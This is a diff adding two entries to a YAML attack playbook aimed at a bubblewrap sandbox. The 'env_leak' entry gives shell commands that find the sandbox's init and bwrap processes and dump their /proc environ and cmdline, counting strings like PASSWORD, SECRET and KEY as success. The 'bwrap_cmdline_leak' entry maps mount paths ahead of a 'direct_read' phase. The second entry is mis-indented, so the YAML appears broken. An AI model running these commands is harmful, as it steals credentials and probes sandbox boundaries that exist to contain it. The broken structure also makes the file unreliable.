@@ -211,3 +211,42 @@ attacks:
     tags:
       - "namespace"
       - "high_impact"
+  - id: "env_leak"
+    phase: "recon"
+    priority: 4
+    description: "Read sandbox process environment variables for leaked secrets"
+    commands:
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); echo PID=$CONTAINER_PID"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); cat /proc/$CONTAINER_PID/environ 2>/dev/null | tr '\\0' '\\n'"
+      - "BWRAP_PID=$(pgrep -f bwrap | head -1); cat /proc/$BWRAP_PID/environ 2>/dev/null | tr '\\0' '\\n'"
+      - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); cat /proc/$CONTAINER_PID/cmdline 2>/dev/null | tr '\\0' ' '"
+    success_indicators:
+      - "TC_DEVICE_PWD"
+      - "SM4"
+      - "KEY"
+      - "PASSWORD"
+      - "SECRET"
+    fail_indicators:
+      - "No such process"
+      - "Permission denied"
+    next_phase: "direct_read"
+    tags:
+      - "environment"
+      - "high_impact"
+
+      - id: "bwrap_cmdline_leak"
+        phase: "recon"
+        priority: 5
+        description: "Read bwrap command line to find mount paths and sandbox configuration"
+        commands:
+          - "BWRAP_PID=$(pgrep -f bwrap | head -1); cat /proc/$BWRAP_PID/cmdline 2>/dev/null | tr '\\0' '\\n'"
+          - "CONTAINER_PID=$(pgrep -f 'bash.*init.sh' | head -1); cat /proc/$CONTAINER_PID/cmdline 2>/dev/null | tr '\\0' '\\n'"
+        success_indicators:
+          - "--ro-bind"
+          - "--bind"
+          - "premount"
+          - "work"
+        next_phase: "direct_read"
+        tags:
+          - "process"
+          - "safe"
